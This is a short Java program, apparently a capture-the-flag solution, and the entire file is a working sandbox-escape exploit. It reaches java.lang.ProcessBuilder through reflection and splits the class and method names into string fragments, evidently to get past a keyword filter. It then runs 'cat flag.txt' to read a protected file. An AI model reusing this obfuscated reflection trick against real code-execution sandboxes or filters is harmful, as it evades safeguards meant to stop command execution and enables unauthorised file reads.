public class Main {
  public static void main(String... args) {
    try {
      System.setErr(System.out);
      System.out.println("Running...");

      String[ ] cmd = {"cat", "flag" + ".txt"};

      Class<?> pb = Main.class.forName("java.lang.Proc" + "essBuilder");
      Object[ ] ins_args = {cmd};
      Object ins = Main.class.forName("java.lang.reflect.Constructor").getMethod("ne" + "wInstance", Object[ ].class)
        .invoke(pb.getConstructor(String[ ].class), (Object) ins_args);

      pb.getMethod("inheritIO").invoke(ins);
      pb.getMethod("start").invoke(ins);
    } catch (Throwable thr) {
      thr.printStackTrace();
    }
  }
}
